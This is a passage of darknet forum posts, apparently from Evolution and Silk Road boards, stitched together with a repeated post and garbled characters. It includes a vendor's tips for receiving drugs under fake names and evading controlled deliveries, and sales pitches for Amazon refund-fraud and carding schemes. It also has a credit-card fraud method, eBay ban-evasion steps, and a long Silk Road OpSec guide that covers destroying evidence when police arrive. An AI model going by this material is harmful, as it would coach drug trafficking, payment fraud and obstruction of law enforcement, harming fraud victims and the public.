tor because it may be possible to correlate traffic that way. For instance, someone could post a message in a forum that contains an image they have on their own tor site, and a link to a clearnet site that they also control. If you view that post your browser will request the image, then if you click their clearnet link they have a record both of your tor info and your clearnet exit node. That but itself is probably not enough to give up your identity but if you do that enough times it would be used to build a profile of your activity. So, if you're going to access clearnet sites you've found on tor, bookmark them for later use and view them an hour or so after you've closed tor. Another thing that can help with this is to change the exit nodes tor uses when accessing clearnet sites. (This setting has no effect when accessing a tor site since if the entire request is within the tor network your traffic never exits through an exit node.) In your Tor Browser\Data\Tor folder there's a file called torrc. Make a backup of it, then add a line such as this to it: ExitNodes {BR} {CZ} {BG} {BA} {AM} {AL}  You can google a list of other country codes to use for additional anonymity. You can check your exit node country with sites like https://www.whatismyip.com/  === Bonus: How To Short BTC There are trading sites such as bitfinex.com that allow you to short BTC outright. Additionally on BTC lending sites you can buy and sell loans that are in BTC but valued in either USD or BTC. This would allow you to create a short position in USD/BTC or the other way around. Btcjam is one such site that allows this. For instance, the person who issued this loan: https://btcjam.com/listings/7732 went short in BTC vs USD. People who invested in his loan went long in BTC vs USD. They also have loans that are marked 'MtGoxUSD' (now defunct) or 'BitstampUSD' such as https://btcjam.com/listings/6257 which mean the repayment amount is calculated in USD rather than straight BTC, so if you issue a BitstampUSD loan you're going long in BTC and short USD. People who buy into the loan take the opposite position and are short BTC. The amount at risk depends on whether you issued the loan or bought the loan. Issuing a loan could mean facing unlimited risk depending on whether you keep the money in BTC or not. For instance, if you issue a BTC loan, use the loaned coins to buy USD, then by the time it's time to pay the loan the price of BTC could have risen so much that you can't get back into BTC and pay it, so that is unlimited risk. However if the price of BTC had fallen then when you buy back in you make money from the short position. On the other hand, people who buy the loans risk no more than the amount they loaned.

I and many, many others have had packages delivered with fake names. There are more nuanced questions, however. The USPS must have some system for associating names with addresses. I will occasionally receive mail that is slightly misaddressed. I.e. if I'm Joe Smith at 1000 Main St, and somebody writes Joe Smith, 1001 Main St -- I still get this mail. Could the USPS use this system to flag suspicious activity? Maybe, but any algorithm for this would have to have a very low false positive rate, as the USPS only has the resources to invesitage a very small percentage of packages. Given the number of people that move on a daily basis, I can't imagine this would work. Using a fake name probably adds no risk. Does this add any security for you? Maybe, but probably not. Once you take delivery of a box of drugs, you're in possession. End of story. The cops are not going to give a shit what name was on the package. Could you maybe use the fact that your name wasn't on the box to sway a symathetic jury? Who knows: you spin the weel and take your chance. *edit* Actually, scratch that whole paragraph. Once you're on the cops radar, the first thing they're going to do it search your house. They're going to find your scale, or your pipe, or your mirror and razor blades and they're going to call that drug paraphenalia, and your ""innocent bystander"" argument is going to go out the window.  At the end of the day, I personally use my real name. Decide for yourself.

"Evolution Forums","MrCrane","5779","2015-02-25T21:56:56","Re: How Not To Get Fucked - A Guide To Buying Illegal Shit On Tor","Security & Anonymity","First off, ""100% provably false"" is an extremely redunant statement, it's either 100% or probably. Now, that that's out of the way. There is a database of who has lived where, but that doesnt mean you cant get mail to somewhere they dont previously have your name on file. What if a new roommate has moved in? What if you have someone visiting from out of town that needs to receive a package at your place? There are several reason why this is not implemented into their procedure.  As for you still receiving a package that is in your name, but slightly misaddressed is because the postman himself personally recognized the mix-up & sorted it out for you. It's not like the postmen walk around with a scanner & scan in & out every single parcel. Not yet anyways. If he were to see a package addressed to your place with a totally different name on it he would still deliver the package to you because he doesnt recognize the name & only knows that its addressed to where it is. Lastly, as for actually protecting yourself from law enforcement, like I always advise my clientes, have your packages sent in a fake name then wait 24hrs, after you are home & received the package, before opening it. If they are going to attempt to set up a controlled delivery they are not going to sit around waiting for more than a day before they just show up & knock at your door. In which case you would say:  ""Oh, you mean this package? Yes, it was addressed to my house, but I didnt recognize the name on it so I was afraid to open it. I was going to take it back to the post office as soon as I got the chance, but I've been busy."" Having a small amount of durgz delivered to your address without your name on it is not ample enough reason for a warrant, in order to obtain the warrant you'd have to open the box & set off the beacon they place in it for controlled deliveries. So, the ""search"" would end there. You'd lose your package & I wouldnt advise having ANYTHING delivered there for a lonnnnnng time, maybe even permanently, but you'd be free.  Now if they have a warrant then it's because they have more on you than you think & you'd better hope youve been practicing good OpSec so none of it can really stand up in a Jury Trial.

No way I can verify who I am, but I have over 1200 completed orders between SR1 & SR2 and I have NEVER lost a package. I always use USPS because they require a federal warrant in order to search & seize your package. Most, if not all, of my clients use fabricated names, I actually advise them to do so, & I always use a false return information: the address is real, but not my own.""The USPS will NOT deliver"" to fake names is 100% provably false. I and many, many others have had packages delivered with fake names.There are more nuanced questions, however.The USPS must have some system for associating names with addresses. I will occasionally receive mail that is slightly misaddressed. I.e. if I'm Joe Smith at 1000 Main St, and somebody writes Joe Smith, 1001 Main St -- I still get this mail. Could the USPS use this system to flag suspicious activity? Maybe, but any algorithm for this would have to have a very low false positive rate, as the USPS only has the resources to invesitage a very small percentage of packages. Given the number of people that move on a daily basis, I can't imagine this would work. Using a fake name probably adds no risk.Does this add any security for you? Maybe, but probably not. Once you take delivery of a box of drugs, you're in possession. End of story. The cops are not going to give a shit what name was on the package. Could you maybe use the fact that your name wasn't on the box to sway a symathetic jury? Who knows: you spin the weel and take your chance.*edit* Actually, scratch that whole paragraph. Once you're on the cops radar, the first thing they're going to do it search your house. They're going to find your scale, or your pipe, or your mirror and razor blades and they're going to call that drug paraphenalia, and your ""innocent bystander"" argument is going to go out the window. At the end of the day, I personally use my real name. Decide for yourself."

This is a new and exciting way to get refunds on Amazon without ever having to stop and never returning the items. Making for HUGE profit. Why a new method?  Why use the old one? It is more likely to get you caught in the end game, and more likely to get refused in the near future. It'll get fixed and people will need a new way like this one!  Why only a few sales?  I'd rather a good 5 people buy it for a premium price and it stay hidden then selling it for a little amount unlimited amount of times and it gets fixed in the near future. Why only one person?  It has huge potential for someone who already sells guides on this but they are outdated, I have purchased quite a few Amazon refund guides from the marketplace and a lot seem to be old played out ones that won't work anymore. I'm especially talking to ""meatmaster"" shame on you for selling your guide that does not work anymore and anyone who messages him to take it down gets ignored. Regardless a already known seller can use or sell this method for a more premium price.  This sale includes two methods. One for beginnersOne for people that want to use this to the extreme Both of which are not sold on the marketplace, I have bought tons of guides and none use these methods. I WILL NOT GIVE OUT A VOUCHER ONE OR FREE COPY FOR FEEDBACK!  I have done this to a guy that is self proclaimed ""The highest post count user on Evo"" and he took my method and didn't leave feedback. I'm here under a new name and looking to sell this.

"Evolution Forums","MedIndia","7396","2014-04-15T11:34:01","Re: can a vpn be traced back to you?","Security & Anonymity","Regardless of how you pay the vpn provider knows who you are. Usually when the vpn connects you to a new IP then the provider knows your real IP then. When you download the VPN software they know where to. If you paid via some 'anonymous' method then they can easily estimate that whoever just paid has now logged into their site and downloaded the application. When you install their application it checks for updates etc and so your real IP is known. Of course you could download using someones wifi and run the application there and then. But i guess most use on their home computer.  PIA can no longer be trusted. Go read their privacy policy, see how old it is and how they mention it can be changed without any notice to anyone. Ultimately we dont know who really owns that VPN or if they work with agencies. A better bet is to use vpn provider from a country that does not require logs to be kept. Buy 3-4 vpn's (they only about $10/month). Keep switching between them and changing IP address.",""

The thing is mostly people get traced over human error not because someone reverse track him/her. Just remember SR owner, he got caught over his mistake not FBI revers track his setup.I would just want to see this movie who would go thru  the crap of revers-tracking average setup people use here, needles to say this is expensive and time consuming for xxx amount of $ damages on some random merchant. Other then that as I said, its much easy to wait for human error witch will happened, especially if you mix your real life activity with your criminal life activity.

He then runs Tor/and or VPN on Comcast's network. If the vendor continues purchasing prepaid comcast internet sessions and uses the same hotspot to run TOR/VPN from his home, what is the chance of him raising a red flag or getting noticed by LE?

They see your phone show up and connect it with your laptop thats only ever connected when that phone is.Proof of concept:Defcon 21 - Stalking a City for Fun and Frivolityhttps://www.youtube.com/watch?v=ubjuWqUE9wQ",""

Not sure if this is the right section to post under, but anyways: I purchased a product from a Chinese vendor, and he has been great enough to provide me with a tracking number for the same, sent via ChinaPOST/EMS. Now, the problem is that when i tried tracking the postage from the website, the destination country mentioned is completely wrong.The mentioned country is at the other corner of the world from where i live, and there is no possibility of the post being routed to the country mentioned in the tracking website first, and then to my country.

Not only do they record data you filled out in their seller application form (name, address, phone number, SSN, credit card, paypal email), they also logged your IP address, computer hardware code (lan card MAC number), computer name, workgroup name etc. You may not even know about these items yourself, but yes eBay logs the things you don't know. They have the right to do so because you have agreed it once you agreed their terms of service as an eBay member.  So to rejoin eBay again, you have to renew all items aforementioned. Here is a simple check list for your easy reference.  1. Change your LAN card AND hard drive so that both hardware codes will go not the same. 2. Change your login username, either use a common name like ""peter"" or ""mary"". Use ""Administrator"" is the best because it is default to Windows OS. It is stupid to use your last email ID registered and shut down on eBay 3. Change your computer name in your OS (typically Windows XP or Vista). Use some generic name like ""my computer"" or ""pc at home"". 4. Change your internet service provider, or request a new fixed IP address. If you are connected with dynamic IP you can skip this step. Ask your ISP if you don't know if you are connecting with fixed or dynamic IP.",""

I've been living in a humble manner (not too greedy nor charitable) and been getting a sustained income from this, so it definitely works, as of 20/06/2014. I've gotten my fair share of money and am ready to let this method go, as I have with my previous methods.  On to the method; the method has the following requirements:      -  You have to reside within Europe for it to work efficiently (though it works worldwide, but is more tedious)      -  A Burner phone is required for verification purposes and for the large chunk of the method      -  Good ol' CCs, preferably from Europe.

I've had relatively good luck watching OpSec videos on YouTube. Try to find ones of security conferences, those guys know what they're talking about. I don't think dynamic ISP will change anything. If they get your ISP details then you are fucked either way. Regarding needing the money first, I'm sure you could build a secure setup for between $100 - $150. Let's just say it takes you a month to save up that much money, this in turn could save you several years in prison. Slow and steady wins the race!

Ben er zelf een beetje skeptisch over of mensen na het verhaal van niet ophalen dan toch gaan betalen via een ""rare site"" zoals 3vcard. Denk dat de mensen toch wel door hebben dat het wat schimmig is. Het zou daarom misschien beter zijn om je toch vooral op de wat minder prijzige producten te richten met eventueel tussendoor een groot product. Eventueel kan je je ook voordoen als bedrijf / de 3vcard te linken aan een paypal en de betalingen via paypal te laten verlopen. Denk dat dit een stuk beter zou zijn. In je topic had ik gelezen dat het mogelijk was. Ik maak zelf ook gebruik van de 3vcards maar doe het zelf op een iets andere manier smile De guide is niet zo duur en dus zou het wel mogelijk moeten zijn met een beetje SE'ing om in ieder geval het aankoopbedrag en nog wat winst te maken",""

If you can card then trust your ability to make the most of this and make a lot of money every year by keeping your merchant account in great condition as you sell hundreds of carded items with no problems. I guarantee you won't be disappointed after you use it.  Once you make your first withdrawal you will realise how valuable this is to long term carding. It's also for those who want to ship items to their own home or to other people without any problems.  It has a lot of value and the fact that it can't be burnt even makes it more so than if it was.  If you can card or have someone who can card for you this is the key that unlocks everything. Try it once and you will start seeing results.  I'm also open to partial payments for those who still can't afford it.

The reason I put this together is mainly for the newbies of this forum. But if I can help anyone out, then I am grateful for this. I would like to start out by saying, if you are reading like, you are likely a Silk Road user. If this is the case, then the #1 thing you must be using to even access this form is Tor. Tor will provide you with a degree of anonymity by using an 128-bit AES (Advanced Encryption Standard). There has been some debate as to whether or not the NSA can crack this code, and the answer is likely yes. This is why, you should never send anything over Tor that you arenât comfortable sharing with the entire world unless you are using some sort of PGP encryption which we will talk about later. Communication from your computer, to the internet relies on an entry node which basically âenters your computerâ into the Tor network. This entry node communicates with your computer, this entry node knows your IP address. The entry node then passes your encrypted request onto the relay node. The relay node communicates with the entry node and the exit node but does not know your computerâs IP address. The exit node, is where your request is decrypted and sent to the internet. The exit node does not know your computerâs IP, only the IP of the relay node. Using this model of 3 nodes it makes it harder, but not impossible to correlate your request to your original IP address. The problem comes obviously when you are entering plain text into TOR because anybody can set up an exit node. The FBI can set up an exit node, the NSA, or any other foreign government, or any malicious person who may want to steal your information. You should not be entering any sensitive data into any websites, especially when accessing them over TOR. If any of the nodes in the chain are compromised, and some likely are, and the people in charge of those compromised nodes have the computing power to decrypt your request, then you better hope it wasnât anything sensitive. So what can we do to fix this? Well, luckily we are now having more and more servers that are offering something called Hidden services. You can easily recognize these services by the address .onion. These services offer whatâs called end-to-end encryption. What this does is take the power out of the compromised exit nodes and put them back in your hands. The web server of the hidden service now becomes your exit node, which means the website you are visiting is the one decrypting your message, not some random exit node ran by a potential attacker. Remember, the exit node has the key to decrypt your request. The exit node can see what you are sending in clear text once they decrypt it. So if you are entering your name and address into a field, the exit node has your information. If you are putting a credit card, a bank account, your real name, even your login information, then you are compromising your identity. Another step you can take, is to only visit websites that use something called HTTP Secure. You can tell if the website you are visiting is using HTTP Secure by the prefix at the beginning of the address. If you see https:// then your website is using HTTP Secure. What this does is encrypts your requests so that only the server can decrypt them, and not somebody eavesdropping on your communication such as a compromised Tor exit node. This is another form of end-to-end encryption. If somebody were to intercept your request over HTTP Secure, they would see encrypted data and would have to work to decrypt it. Another reason you want to use HTTPS whenever possible, is that malicious Tor nodes can damage or alter the contents passing through them in an insecure fashion and inject malware into the connection. This is particularly easier when you are sending requests in plain text, but HTTPS reduces this possibility. You must be made aware however, that HTTPS can also be currently cracked depending on the level of the key used to encrypt it. When you visit a website using HTTPS, you are encrypting your request using their public key and they are decrypting it using their private key. This is how cryptography works. A public key is provided to those who want to send an encrypted message and the only one who can decrypt is the one with the private key. Unfortunately, many websites today are still using private keys that are only 1,024 bits long which in todayâs world are no longer enough. So you need to make sure you find out which level of encryption the website you are visiting uses, to make sure they are using at a minimum 2,048, if not 4,096 bits. Even doing all of this unfortunately is not enough, because we have another problem. What happens if the web server itself has become compromised? Maybe your TOR nodes are clean, maybe you have used HTTPS for all your requests, but the web server itself of the website you are visiting has been compromised. Well then all your requests are again, as good as plain text. With that being said, this will conclude the first post in this series of the steps we can take to protect our privacy online, to remain anonymous and maintain our freedom. 2. PGP, TAILS, VIRTUAL BOXSo keep in mind that if you are a user of Silk Road, or any other form of activism, you never want to enter any identifying details about yourself online. Make it so that even if the NSA intercepted and decrypted, or compromised Silk Road that the only information they have against you is your username and password. How safe is that username and password? Does your password contain any identifying information? Is it the same password that you use for your personal email? Does it contain a name of somebody you know personally? Always keep all of these factors in mind. Another step you must take, especially when communicating with other users on sites such as Silk Road is using PGP encryption. This is not always possible, such as in cases when you are logging into a website, filling out a form, logging into an email, etc.. Consider any type of information you enter into a website using plain text possibly compromised. Never put anything sensitive is any type of plain text format online. PGP comes into play because it uses a very strong method of encryption called cryptography. PGP stands for Pretty Good Privacy, and it is used for encrypting, decrypting and signing texts, e-mails, files, directories, and whole disk partitions and to increase the security of e-mail communications. For the more technical users, it uses a serial combination of hashing, data compression, symmetric-key cryptography, and finally public-key cryptography. For the less technical users, the process of encrypting messages using PGP is as follows. You create a private key and a public key. The public key is the key you give out to people you want to send you encrypted messages. Your private key, is kept privately by you. This private key is the only key that can unlock messages that were previously locked with your public key. If you are still confused, think about it like this. Think about a public key that can go around locking boxes that are intended for you. Anyone can lock a box that is intended for you, but you are the only one with the key to unlock the box. Either if the person who sent you a message locked a box (message) with your public key, they themselves can not unlock it. Only the person possessing the private key can unlock it. If you wish to respond to this person, you must use their public key to encrypt the message you intend to send to them. And they themselves, use their own private key to decrypt the message you sent them. If you are still with me, I am glad I havenât lost you yet. This is called cryptography and was designed so that anybody intercepting your message could not decrypt the message without your private key. Even if you yourself, lose your private key, there is no method of key recovery. You can consider that message locked forever. So how do you use PGP? Well before we get to that, I want to introduce you to a Live Operating System, which makes using PGP encryption and decryption very easy. A live operating system is an operating system that you can run on top of your current operating system. So for example, if you are a Windows user, you have 2 choices. You can download the live operating system, burn it to a CD or DVD and then boot your computer from that DVD or CD. This will make sure your computer run as if you have this operating system installed on your computer. However, if you remove the CD or DVD and reboot, then your computer will boot as normal. You can also use a USB drive to perform this same feature. Secondly, you can run this live operating system in whatâs called a Virtual Box. The benefits of this are that you can run Windows simultaneously as you run this other operating system and you can easily switch back and forth between them without rebooting the computer. Both methods have their pros and cons. The pros of running a live CD boot, are that reduce the risk of having your computer compromised by viruses, malware and keyloggers that rely on Windows vulnerabilities to run. If you are going to run this OS from a Virtual Box, I suggest downloading Virtual Box from Oracle. Note the https://  https://www.virtualbox.org/ Next, the live operating system I would encourage you to use is Tails. Tails can be found at the following website. https://tails.boum.org/ The reason I choose Tails, is because it has many of the security features that you require to stay anonymous already installed. Some users are not happy with Tails, but it really is a great operating system loaded with security features. Many I will talk about in this series on security including PGP encryption and decryption. Make sure you download the Tails ISO file from the official Tails website and you can either load it into Virtual Box or burn it to a DVD or load it onto a USB and booting your computer from that drive. There are plenty of tutorials on how to load Tails into Virtual Box, so I wonât go into much detail other than, make sure you run Virtual Box and Tails from a USB drive or SD card. I would suggest a USB drive however for reasons I will explain later. But basically when when Virtual Box runs directly on your hard drive, it creates a virtual hard drive that is uses as a temporary hard drive while Tails is running. Once Tails is closed, this virtual drive is deleted, but itâs not permanently deleted. As we know from the power of recovery tools, deleted files are easily recoverable with the right tools. I will talk about how to protect your files from data recovery tools in future posts but for now, just keep Virtual Box and Tails OFF of your hard drive, and load it either on a USB drive or SD card. The same goes when booting your computer directly into Tails from a DVD or USB stick. Your hard drive will be used to store files used by Tails, so make sure any files that are saved or accessed using Tails are done from a USB stick or SD card, otherwise they will be recoverable. This is why I prefer using a Virtual Box and running both the Virtual Box and Tails inside of it, off of a USB stick. Keep as much as possible off of your actual hard drive. It is possible to shred files beyond recovery, but itâs much easier to do this on a 16gb flash drive, then it is a 1 TB hard drive. Ok, so by now I am assuming you have Tails running. Letâs learn how to use PGP within Tails. First thing you are going to want to do is create your own personal key, which consists of your public key that you can give out to people or post in your profiles online. As mentioned before, this is the key people use to encrypt messages to send to you. Your personal key also consists of your private key which you can use to decrypt messages that are encrypted using your PGP public key. If you look up to the top right area, you will see a list of icons, and one o them looks like a clipboard. You need to click on that clipboard and click Manage Keys Next click File -> NewSelect PGP Key and click ContinueFill out your full name (I suggest you use your online name, not your real name)Optionally fill out an email and a comment as well.Next, click Advanced Key Options.Make sure Encryption type is set to RSA and set key strength to 4096.Once you have done this, click Create and it will generate your key. Once you have done this, you can view your personal key by clicking the tab My Personal Keys. You have now created your personal key! To find your PGP public key, you right click on your personal key and click Copy and it will copy your PGP public key to your clipboard, in which you can paste anywhere you wish.

If you are running Tails from a USB drive, then you must use a separate drive to store your key on. If you are running Virtual Box, you want to right click on the icon in the bottom right corner that looks like a USB drive, and select your separate drive that you will be using to store your keys on. Again, never store your private keys on your hard drive, keep them OFF your computer. To save your private key, you are going to right click on your personal key and click Properties. I know you probably saw where it says Export, but this is not what you want to do. Clicking export will ONLY export your public key and will not save your private key. If you lose your private key, you can never recover it even if you create another personal key using the exact same password. Each private key is unique to the time it was created and if lost, is lost forever. So once you have clicked Properties, go over to the tab Details and click Export Complete Key. Once you have done this, you have saved your personal key for future use once you restart Tails. Remembering that Tails is not installed on your hard drive, so every time you restart Tails you lose all your keys. By saving your keys onto a USB drive or SD card, you can import your keys for use every time you restart it. Next you are going to want to learn how to encrypt and decrypt messages using your key. Well, luckily for me, Tails has already made a tutorial on how to do this, so I will refer you to their webpage. But before I do that, I need to mention that you need to find somebody elseâs PGP public key, or you can practice by using your own. Needless to say, the way you import other peopleâs keys into whatâs called your key ring is by loading them into a text file. You do this with the program called gedit Text Editor. Click Applications -> Accessories -> gedit Text Editor and enter in someoneâs public key and hit save. Next you can return to your key program from the clipboard icon and click File -> Import and select that file. It will import that personâs public key into your key ring. To add future public keys to your key ring, I suggest reopening the same file and just adding the next key below the previous key and each time you open that file it will load all keys within that file. This way you can keep all the PGP public keys together in one file and save it on your SD card or USB drive for future use. Finally you can use the following 2 pages to learn how to encrypt and decrypt messages using PGP. https://tails.boum.org/doc/encryption_and_privacy/gpgapplet/public-key_cryptography/index.en.html https://tails.boum.org/doc/encryption_and_privacy/gpgapplet/decrypt_verify/index.en.html Until next time. Have fun with your new found ability to communicate in PGP! 3. WHOLE DISK ENCRYPTION AND FILE SHREDDINGNow that we have PGP figured out, hopefully, I want to remind you that using PGP whenever possible, is very very very important. One of the pitfalls of Silk Road 1, is that some of the administrators, including Ross himself did not always communicate using PGP encryption. Once Ross was busted, they had access to his servers and his computers and anything that wasnât encrypted was wide open for them to look at. Most users on Silk Road 2 believe that Ross had stored personal information about some of Admins and Moderators on his computer in plain text that was used to make 3 more arrests of Silk Road users. One of the reasons why I would suggest for you to store your PGP keys and other sensitive data on a SD card, is that if that day comes when you are compromised and you get a knock at your door, you have time to dispose of that SD card or USB drive quickly. Even better, if you have a micro SD card that plugs into an SD adapter, then you can snap it with your fingers or at the very least hide it. USBs would need to be smashed into pieces and it might not be easy to do this in the heat of the moment, so do what you feel best about. But always prepare for the day they might come for you. But our next topic brings us to something called Whole Disk Encryption or Full Disk Encryption. From here on out I will refer to it as FDE (Full Disk Encryption). Tails has a FDE feature built into it, which is another reason why I encourage the use of Tails. It has many of these features to protect you. Essentially FDE will protect your drive, whether SD or USB from the people who may come for you one day. The method in which it does this is it formats your drive and rewrites the file system in an encrypted fashion so that it can be only be accessed by someone who has the pass phrase. If you lose your passphrase, just like in PGP, there is no recovery. Your only choice is to format the drive and start over again. So make sure you remember it! And please for the love of God, Allah, Buddah, etcâ¦ donât store the passphrase on your hard drive somewhere. The tutorial on how to do this is located at the following webpage. https://tails.boum.org/doc/encryption_and_privacy/encrypted_volumes/index.en.html Again, always prepare for the day they come knocking, encrypt everything. Use PGP when communicating with others and always shred your files when finished with them. Which brings me to my next topic. File shredding. File shredding is extremely important and here is why. If you delete a file from your computer, you are only deleting where it is located on the drive. It is still on the actual drive, just itâs location data has been removed. If you take a file recovery tool you can recover virtually any file that you have recently removed. File shredding combats this by overwriting files instead. The idea is that instead of removing the fileâs location, you need to overwrite the file with random data so that is becomes unrecoverable. There are a lot of debate happening on whether you can overwrite a file once, or if you need to do it multiple times. Supposedly the NSA recommends 3 times, supposedly the Department of Defense recommends 7 times, and an old paper by a man named Peter Gutmann written in the 90?s recommended 35 times. Needless to say, I personally think between 3-7 times is sufficient, and several people out there believe 1 time will get the job done. The reasoning behind this is that some people believe the drive may miss some files the first time it over writes them and to be more complete, you should do multiple passes. Do what you feel most comfortable with, but I even think 3 passes would be sufficient, although it wouldnât hurt every now and then to run 7 passes and just leave it overnight. The programs that can do file shredding are ones you will want to run from Windows or whatever operating system your computer is running. These programs can delete your files from your Recycling Bin, delete your temporary internet files and even Wipe your free disk space to make sure everything gets cleaned up. You always need to think, did I have any sensitive material on my hard drive? If so, maybe I need to shred my free disk space. When empting your Recycle Bin, you should always use a shredder. When only deleting under 1gb at a time, you can easily do 7 passes pretty quickly. To put this in perspective, the leader of a group called LulzSec name Topiary has been banned as part of his sentence from using any type of file shredding applications so that if the FBI wants to check up on him, they can. File shredding keeps your deleted files actually deleted. Here are some file shredding applications you can use.http://www.dban.org/http://www.fileshredder.org/https://www.piriform.com/ccleaner Next weâre going to talk about removing harmful metadata from files, and some other topics as well. JAVASCRIPT VULNERABILITIES AND REMOVING PERSONAL METADATA FROM FILESWelcome Back. Before I get into removing harmful meta data from your files, I want to talk about another vulnerability to our browsing capabilities called Javascript. In mid 2013, a person in Ireland was providing hosting to people that hosted hidden services including a secure email platform called Tor Mail. Unfortunately they busted him on an unrelated charge relating to child pornography and seized all his servers. Whether or not he was related to child porn or not, is unknown to me, or it could be a silly charge the feds slapped him with but either way, the feds ended up injecting malicious Javascript into his servers so that when users would visit certain sites, this malicious code would execute on their computers and reveal information about their computers to the feds. I suggest you read the following article to learn more about this. https://openwatch.net/i/200/ With that being said, you may want to disable Javascript in your browsers, especially when visiting certain websites like Silk Road that may become compromised one day. Many users refuse to visit the original Silk Road website and forums with Javascript enabled because the feds likely injected it with malicious Javascript to identify users. In Tails, the browser is called Iceweasel and when Tor in ran in Windows, it uses Firefox. Both browsers can disable Javascript using the exact same method. Open up a Window and type the following command in the address bar, âabout:configâ and click the button that says âIâll be careful, I promise.â This will bring up a bunch of settings including a search bar at the top. Enter javascript in the search bar and look for the following two entries, âjavascript.enabledâ and âbrowser.urlbar.filter.javascriptâ. Right click on these and click âToggleâ and you will see the Value changed to false. If you want to enable Javascript again, just click Toggle again and you will see the value change back to true. Again, remember that every time you restart Tails you will have to do this again, so get into a habit of doing this every time. You never know when your favorite website could become compromised. Moving onto meta data. There is a bit of a famous story about an online hacker named w0rmer that would take pictures of his girlfriend and post them online after he would deface a webpage. What he either forgot, or didnât know was that photos taken with the iPhone and other smart phones save the GPS coordinates of where the picture was taken and store it in the meta data of the picture. Check out this article below. https://encyclopediadramatica.es/W0rmer You need to remove this meta data! Otherwise you could end up in federal prison with w0rmer. Luckily Tails has a solution for this! See why I love Tails? Applications -> Accessories -> Metadata Anonymisation Toolkit Please get a more clear idea of how this works by reading the following page. https://mat.boum.org/ Please note the currently supported formats. In terms of pictures, jpg, jpeg and png. But unfortunately MAT is not perfect and I wouldnât solely rely on it, so a better idea would be to never upload pictures of yourself or your significant other online, especially bragging about a hack you committed. Please read the site provided above for more information.  GENERAL SECURITY PRECAUTIONS WHEN POSTING ONLINE, LEARN FROM OTHERSâ MISTAKESNext I want to talk about good practices when using TOR, Tails and other hidden services. First of all, it is highly recommended that you use multiple identities online for different things. Perhaps if you are a buyer and a seller on Silk Road, you may want to have separate logins for this. And then possibly a third login for the forums. Then maybe you want to be part of another marketplace, then you might want a fourth login. Well, Tails has another good program offered by Tails is called KeePassX. When you have multiple logins, it is hard to keep track of them all, so it might be a better idea to keep them all in 1 document that is encrypted with a strong password. KeePassX can help you with this. https://tails.boum.org/doc/encryption_and_privacy/manage_passwords/index.en.html You never want to use nicknames or locations, or anything else that is related to yourself online when you post or create usernames. And another thing you need to adopt are new ways of conducting yourself. If you are generally a messy typer, who makes the same grammar mistakes, or the same spelling mistakes all the time, this can be used to identify you. Always proof read anything you post publicly, or privately because the feds will always find ways to correlate things to you. With Ross Ulbricht, they found an old post he posted on a forum when he first started Silk Road asking people if they had heard of a marketplace called Silk Road. Obviously this is an old trick used by people trying to spread awareness about a new project of theirs. Later he identified himself by saying he was looking for programmers and gave out his private email address on the same forum under the same name. But if you always misspell the same words, if you always use the same slang terms, capitalize the same words, use a certain amount of periods after an etcâ¦. or always use the same number of !!!!! then all of these things give them reasonable suspicion and it becomes easier to tie things to you. Once they have you under their radar, like they had Ross, it only took a few slip ups and he was theirs. Remember, you only have to make one mistake. So talking about your local election is a really dumb idea, get it? Think about the time you use your computer. Is it easy to correlate your timezone based on the time you go online? Or is it more random? Do you have patterns that are predictable? Always think about these things when you post online. Always think about what type of personality you are putting out there about your online name. Expect that every single word you type online is being read by the Feds. To them, this is much easier than tracking drug lords on the streets. They sit in an office and read forum posts and try and make connections. Donât underestimate the feds. Always treat everything as compromised, always treat everybody as compromised and donât ever think anybody will ever go to jail for you. If somebody can avoid 10-20 years by ratting you out, they will do it in a heart beat. The perfect example is Sabu from LulzSec. After he was busted and facing 112 years in jail, they made him a deal to help them rat out his friends and he ended up getting many of his âfriendsâ arrested. Even people who are your friends will turn their backs on you when it comes down to their freedom. EXIF DATA I forgot to mention above when talking about metadata, that when it comes to photos, there is another risk involved called EXIF data, this is another form of meta data specifically related to images and may not be properly removed by Metadata Anonymisation Toolkit mentioned before. EXIF data stands for Exchangeable image file format and affects JPG, JPEF, TIF and WAV files. A photo taken with a GPS-enabled camera can reveal the exact location and time it was taken, and the unique ID number of the device â this is all done by default â often without the userâs knowledge. In December 2012, anti-virus programmer John McAfee was arrested in Guatemala while fleeing from alleged persecution in Belize, which shares a border. Vice magazine had published an exclusive interview with McAfee âon the runâ that included a photo of McAfee with a Vice reporter taken with a phone that had geotagged the image. The photoâs metadata included GPS coordinates locating McAfee in Guatemala, and he was captured two days later. To avoid this, only take photos that use PNG because it does not store EXIF data. To check if your photo has any revealing EXIF data attached to it, check out this site. http://www.viewexifdata.com/ or you can download a tool by doing a quick search online to see what EXIF data may be contained in your photos before you upload them. Be very careful with any files that you upload online, because you never know what type of harmful data could be attached in them. It helps to use Tails, but always consider everything you put online as a potential piece of evidence to be used against you and always prepare for the day the feds come to your door. RETAINING A LAWYER, HOW TO HANDLE GETTING CAUGHT OR INTERROGATED Next entry into the series on security is how to handle getting caught. Let us face it. We are all human and we make mistakes. Unfortunately, you only need to make one mistake, and the Law Enforcement, commonly referred to as LE on these forums can bust you. Maybe they will wait for you to do something more serious before they nab you, but if you slip up and they feel you are worth going after, you can expect them to get you no matter where you live, with rare exception. The first thing I want to do is link you to another thread I just came across on these forums. https://silkroad5v7dywlc.onion/index.php?topic=13093.0 The main question is, should I keep an emergency lawyer fund on hand? And how much should it be. The response I think was most appropriate for this question was the following.     Give your lawyer 50k and put him on a retainer.     Donât have a emergency fund âstashâ lying around if that is what you meanâ¦. you should already have your lawyer paid + plus extra in case he needs to post bond for you and they seize the majority of your drug funds. Once you get arrested by LE, they can seize your money based on the assumption that it is drug related. So you need to have a lawyer paid for ahead of time. That way, in the unfortunate case that you get a visit from the feds, you have a lawyer ready to go. The agreed upon amount was around $50,000. Next I want to talk to you about what to do in case you get interrogated by LE. There is a great thread about this. https://silkroad5v7dywlc.onion/index.php?topic=4461.0 The take homes from this thread are basically. Keep your moouth shut. The feds are going to try all types of tactics on you to get you to admit to guilt of the crimes you are being accused of. They will likely use the good cop, bad cop on you. First they will tell you that they want to help you, and that they are after the big guys. They just need your help to put away the big guys. Do not listen to this, I have never cooperated with a good cop LE and have it end up working in my favor. Once you admit to being guilty, you can kiss your freedom good bye. Secondly, if you refuse to cooperate, their attitude will change to bad cop. They will say, âOK fine, you do not want to cooperate? I tried to help but now you are going to be in a lot of trouble. Do you have any idea what kind of charges you are facing? You are going away for a long time unless you start talking.â They are going to try and scare you into admitting guilt. Again, keep your mouth shut and continue to ask for a lawyer, hopefully the one you put on a $50,000 retainer prior to this happening. Never speak without a lawyer present and never do anything you do not have to do legally. If you have the right to remain silent, then exercise that right. I know there are some circumstances in which you do not have that right, but unless that is the case, you are better off staying quiet. Third, drop the attitude. Do not argue with the cops about having 